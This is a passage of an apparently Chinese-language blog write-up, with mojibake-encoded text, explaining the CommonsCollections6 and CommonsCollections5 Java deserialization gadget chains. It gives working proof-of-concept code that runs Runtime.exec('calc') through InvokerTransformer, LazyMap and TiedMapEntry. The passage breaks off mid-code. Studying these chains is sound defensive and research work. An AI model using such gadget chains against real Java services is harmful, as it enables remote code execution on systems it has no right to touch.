<p>è¿™é‡Œæˆ‘è°ƒè¯•çš„æ—¶å€™ï¼Œè¿™é‡Œæˆ‘ç‚¹å‡»å †æ ˆä¸­çš„<code>AnnotationInvocationHandler</code>ç±»ï¼Œä¼šè‡ªåŠ¨å¼¹å‡ºå‡ ä¸ªè®¡ç®—å™¨ï¼Œåé¢mapä¹Ÿä¼šæœ‰<code>entrySet</code>è¿™ä¸ªkeyï¼Œè¿›å…¥ä¸äº†è¿™ä¸ªifã€‚ç„¶å<code>AnnotationInvocationHandler</code>ä¸­æˆ‘ä¸èƒ½æ‰“æ–­ç‚¹ä¸ç„¶ä¹Ÿä¼šå‡ºç°ä¸Šé¢çš„æƒ…å†µã€‚</p>
<p>æ€»çš„æ¥è¯´ï¼Œå°±æ˜¯ä¸ä¼šæŒ‰ç…§ä½ è®¾æƒ³çš„èµ°ï¼Œè¿™é‡Œæˆ‘ä»¬å…³æ‰ä¸€ä¸ªè®¾ç½®å°±å¥½äº†</p>
<p><img loading="lazy" src="../images/image-20241107172159760.png" alt="image-20241107172159760"  />
</p>
<p><strong>è§£å†³ï¼š</strong></p>
<p>è¿™é‡Œå…³é—­<code>å¯ç”¨é›†åˆç±»æ›¿ä»£è§†å›¾</code>ï¼Œè¿™ä¸ªæˆ‘å°±æ²¡æ·±ç©¶ä¸ºä»€ä¹ˆäº†ï¼Œæœ‰æ‡‚çš„å¤§å“¥å°±è¡¥å……ä¸‹ï¼</p>
<p><img loading="lazy" src="../images/image-20241107172506206.png" alt="image-20241107172506206"  />
</p>
<h1 id="commonscollections6"><strong>CommonsCollections6</strong><a hidden class="anchor" aria-hidden="true" href="#commonscollections6">#</a></h1>
<blockquote>
<p>ç”±äºåœ¨ Java 8u71ä»¥å sun.reflect.annotation.AnnotationInvocationHandler#readObject çš„é€»è¾‘å‘ç”Ÿæ”¹å˜ï¼Œå¯¼è‡´CommonsCollections1 åˆ©ç”¨é“¾æ— æ³•ä½¿ç”¨ï¼Œå› ä¸º sun.reflect.annotation.AnnotationInvocationHandler çš„readObjectå‡½æ•°ä¸å†ç›´æ¥ä½¿â½¤ååºåˆ—åŒ–å¾—åˆ°çš„ Map å¯¹è±¡ï¼Œâ½½æ˜¯æ–°å»ºäº†â¼€ä¸ª LinkedHashMap å¯¹è±¡ï¼Œå¹¶å°†åŸæ¥çš„é”®å€¼æ·»åŠ è¿›å»ã€‚</p>
<p>ä¸ºè§£å†³Javaâ¾¼ç‰ˆæœ¬åˆ©â½¤é—®é¢˜ï¼Œå®é™…ä¸Šå°±æ˜¯åœ¨æ‰¾ä¸Šä¸‹â½‚ä¸­æ˜¯å¦è¿˜æœ‰å…¶ä»–è°ƒâ½¤ LazyMap#get() çš„åœ°â½…ã€‚</p>
</blockquote>
<p>çœ‹åˆ°æœ€åä¸€è¡Œä¼šè¦†ç›–æˆ‘ä»¬çš„<code>Lazymap</code>ä¸º<code>LinkedHashMap</code></p>
<p><img loading="lazy" src="../images/image-20241107173405506.png" alt="image-20241107173405506"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Gadget</span><span class="w"> </span><span class="n">chain</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectInputStream</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">HashSet</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">HashMap</span><span class="p">.</span><span class="na">put</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">HashMap</span><span class="p">.</span><span class="na">hash</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">collections</span><span class="p">.</span><span class="na">keyvalue</span><span class="p">.</span><span class="na">TiedMapEntry</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">collections</span><span class="p">.</span><span class="na">keyvalue</span><span class="p">.</span><span class="na">TiedMapEntry</span><span class="p">.</span><span class="na">getValue</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">collections</span><span class="p">.</span><span class="na">map</span><span class="p">.</span><span class="na">LazyMap</span><span class="p">.</span><span class="na">get</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ChainedTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashSet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC6</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">constantTransformer</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">,</span><span class="n">invokerTransformer1</span><span class="p">,</span><span class="n">invokerTransformer2</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LazyMap</span><span class="w"> </span><span class="n">fistrmap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LazyMap</span><span class="p">)</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">(),</span><span class="n">keyTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">fistrmap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;fistrmap&#34;</span><span class="p">,</span><span class="n">1111</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TiedMapEntry</span><span class="w"> </span><span class="n">tiedMapEntry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">(</span><span class="n">fistrmap</span><span class="p">,</span><span class="s">&#34;fistrmap&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">tiedMapEntry</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;B&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashSet</span><span class="w"> </span><span class="n">hashSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashSet</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">map1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hashSet</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;map&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map1</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">hashSet</span><span class="p">,</span><span class="n">map</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tiedMapEntry</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;key&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">key</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">key</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">tiedMapEntry</span><span class="p">,</span><span class="s">&#34;kkkey&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">hashSet</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>é“¾å­æ•´ä½“å¾ˆç®€å•ï¼Œè‡ªå·±çœ‹åˆ©ç”¨é“¾æ„é€ pocå°±è¡Œã€‚</p>
<p>å¤§æ¦‚æœ‰ä¸¤ä¸ªåœ°æ–¹è¦è®²å§</p>
<ul>
<li><strong>mapä¼ å‚</strong></li>
</ul>
<p>mapçœ‹ä¼¼æ²¡æ³•æ§åˆ¶å®åˆ™ä¸ç„¶ï¼Œçœ‹åˆ°ä¸Šä¸€è¡Œeçš„è·å–æ˜¯ååºåˆ—åŒ–è·å–çš„ï¼Œæˆ‘ä»¬å»çœ‹writeObject</p>
<p><img loading="lazy" src="../images/image-20241107183915883.png" alt="image-20241107183915883"  />
</p>
<p>ä¸Šé¢eå…¶å®æ˜¯mapä¸­çš„keyåºåˆ—åŒ–å­˜å‚¨çš„ï¼Œæ‰€ä»¥eæˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œç„¶åå°±æœ‰åé¢çš„é“¾å­è°ƒç”¨äº†</p>
<p><img loading="lazy" src="../images/image-20241107184145740.png" alt="image-20241107184145740"  />
</p>
<p>å¯ä»¥çœ‹åˆ°keyæ˜¯æˆ‘ä»¬ç²¾å¿ƒè®¾ç½®çš„å€¼</p>
<p><img loading="lazy" src="../images/image-20241107184317909.png" alt="image-20241107184317909"  />
</p>
<h5 id="é—®é¢˜4-lazymapget">é—®é¢˜4 Lazymap.get<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜4-lazymapget">#</a></h5>
<p>è¿™é‡Œå› ä¸º<code>åºåˆ—åŒ–</code>çš„æ—¶å€™æœ‰<code>HashMap#put</code>è¿™ä¸ªæ“ä½œä¼šè°ƒç”¨åˆ°æœ€ååˆ©ç”¨ç‚¹ï¼Œä½†æ˜¯è¿™é‡Œè¿˜ä¸èƒ½è¢«è°ƒç”¨ï¼Œå› ä¸ºè°ƒç”¨å<code>åºåˆ—åŒ–è¿˜æ²¡å®Œæˆ</code>å°±ä¼šæŠ¥é”™é€€å‡º</p>
<p>ä½†æ˜¯keyä¸€æ ·çš„è¯çš„ï¼Œååºåˆ—åŒ–è¿™é‡Œå°±ä¼šä¸º<code>true</code>å°±ä¸ä¼šè¿›å…¥if</p>
<p><img loading="lazy" src="../images/image-20241107183525178.png" alt="image-20241107183525178"  />
</p>
<p><strong>è§£å†³ï¼š</strong></p>
<p>è¿™é‡Œå°±æ˜¯å…ˆè®©å…¶<code>key</code>ä¸€æ ·ï¼Œç„¶å<code>HashMap#put</code>åè·³è¿‡ifï¼Œç„¶åæˆ‘ä»¬åœ¨åˆ©ç”¨åå°„ä¿®æ”¹<code>key</code></p>
<p><img loading="lazy" src="../images/image-20241107185123569.png" alt="image-20241107185123569"  />
</p>
<h1 id="commonscollections5">CommonsCollections5<a hidden class="anchor" aria-hidden="true" href="#commonscollections5">#</a></h1>
<p>cc5 å°† cc6 çš„å…¥å£ç‚¹ HashMap æ›¿æ¢æˆäº† BadAttributeValueExpException</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Gadget</span><span class="w"> </span><span class="n">chain</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">javax</span><span class="p">.</span><span class="na">management</span><span class="p">.</span><span class="na">BadAttributeValueExpException</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                    </span><span class="n">TiedMapEntry</span><span class="p">.</span><span class="na">toString</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    									</span><span class="n">TiedMapEntry</span><span class="p">.</span><span class="na">getValue</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                            </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">get</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                                </span><span class="n">ChainedTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC5</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">constantTransformer</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">,</span><span class="n">invokerTransformer1</span><span class="p">,</span><span class="n">invokerTransformer2</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LazyMap</span><span class="w"> </span><span class="n">fistrmap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LazyMap</span><span class="p">)</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">(),</span><span class="n">keyTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">fistrmap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;fistrmap&#34;</span><span class="p">,</span><span class="n">1111</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TiedMapEntry</span><span class="w"> </span><span class="n">tiedMapEntry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">(</span><span class="n">fistrmap</span><span class="p">,</span><span class="s">&#34;nono&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
